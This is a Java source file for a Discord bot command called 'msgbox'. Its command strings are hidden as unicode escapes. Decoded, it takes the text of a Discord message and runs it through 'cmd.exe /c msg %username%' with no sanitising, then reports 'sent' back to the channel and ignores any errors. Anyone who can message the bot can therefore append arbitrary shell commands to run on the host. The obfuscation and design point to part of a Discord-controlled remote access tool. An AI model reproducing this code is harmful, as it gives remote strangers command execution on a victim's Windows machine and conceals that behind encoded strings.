package cmd;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;

public class MsgBox extends Command{
    public MsgBox(){
        this.name = "\u006d\u0073\u0067\u0062\u006f\u0078";
        this.usage = "\u006d\u0065\u0073\u0073\u0061\u0067\u0065 \u0062\u006f\u0078";
        this.desc = "";
        this.type = CommandType.GENERAL;
    }

    @Override
    public boolean onCommand(User user, Message message, String[] args) {
        try {
            String str = "";
            for (int i = 0; i < args.length; i++) str += args[i] + " ";
            str = str.substring(0, str.length() - 1);
            Process process = Runtime.getRuntime().exec("\u0063\u006d\u0064\u002e\u0065\u0078\u0065 \u002f\u0063 \u006d\u0073\u0067 \u0025\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0025 "+str);
            message.getChannel().sendMessage("\u0073\u0065\u006e\u0074\u003a \u0060"+str.toLowerCase()+"\u0060").queue();
        }catch (Exception ee){}
        return true;
    }
}
